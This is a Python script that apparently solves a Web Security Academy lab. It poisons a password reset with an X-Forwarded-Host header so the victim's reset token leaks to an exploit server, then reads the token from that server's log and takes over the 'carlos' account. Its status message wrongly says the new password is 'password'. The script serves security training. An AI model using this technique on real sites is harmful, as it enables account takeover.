from web_security_academy.core.exploit_server import ExploitServer
from web_security_academy.core.utils import *
from urllib.parse import urlparse

import re


def solve_lab(session):
    exploit_server = ExploitServer(session)
    host = urlparse(exploit_server.url).netloc

    print_info(
        'Generating a password reset email for "carlos" adding the following header:'
    )
    headers = {"X-Forwarded-Host": host}
    print(headers, end="\n\n")
    session.post_path(
        "/forgot-password",
        headers=headers,
        data={"username": "carlos"},
    )

    print_info("Extracting password reset token from exploit server log...")
    log = exploit_server.access_log()
    tokens = re.findall(
        r"(?<=\/forgot-password\?temp-forgot-password-token=)[^ ]+", log
    )
    if len(tokens) == 0:
        print_fail("Unable to extract password reset token.")
    else:
        token = tokens[-1]
        print_success(f"Token: {token}\n")

    password = "123456"
    data = {
        "temp-forgot-password-token": token,
        "new-password-1": password,
        "new-password-2": password,
    }
    print_info('Changing carlos\'s password to "password"...')
    session.post_path("/forgot-password", data=data)
    session.login("carlos", password, with_csrf=False)
